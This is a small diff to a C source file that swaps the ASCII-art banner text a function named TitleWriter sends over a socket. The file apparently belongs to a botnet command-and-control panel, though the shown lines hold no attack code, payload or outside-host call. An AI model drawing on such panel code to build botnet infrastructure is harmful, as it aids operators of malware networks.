@@ -353,9 +353,9 @@ void *TitleWriter(void *sock) {
 
   		sprintf(Sakura_banner0,   "\033[2J\033[1;1H");
   		sprintf(Sakura_banner1,  "\e[0m\r\n");
-  		sprintf(Sakura_banner2,  "\e[1;95m╔═╗  ╔═╗  ╦╔═  ╦ ╦  ╦═╗  ╔═╗\e[0m\r\n");
-  		sprintf(Sakura_banner3,  "\e[1;95m╚═╗  ╠═╣  ╠╩╗  ║ ║  ╠╦╝  ╠═╣\e[0m Type \e[1;95mHELP\e[0m For Help.\e[0m\r\n");
-  		sprintf(Sakura_banner4,  "\e[1;95m╚═╝  ╩ ╩  ╩ ╩  ╚═╝  ╩╚═  ╩ ╩\e[0m\r\n");
+  		sprintf(Sakura_banner2,  "\e[1;95m╔═╗┬┌─┬─┐┬─┐  ╔═╗┬┌─┬─┐┬─┐  ╔═╗┌─┐┬ ┬┌─┐┬─┐\e[0m\r\n");
+  		sprintf(Sakura_banner3,  "\e[1;95m╚═╗├┴┐├┬┘├┬┘  ╚═╗├┴┐├┬┘├┬┘  ╠═╝│ ││││├┤ ├┬┘\e[0m Type \e[1;95mHELP\e[0m For Help.\e[0m\r\n");
+  		sprintf(Sakura_banner4,  "\e[1;95m╚═╝┴ ┴┴└─┴└─  ╚═╝┴ ┴┴└─┴└─  ╩  └─┘└┴┘└─┘┴└─\e[0m\r\n");
   		sprintf(Sakura_banner5,  "\e[0m\r\n");
 
   		if(send(datafd, Sakura_banner0, strlen(Sakura_banner0), MSG_NOSIGNAL) == -1) goto end;
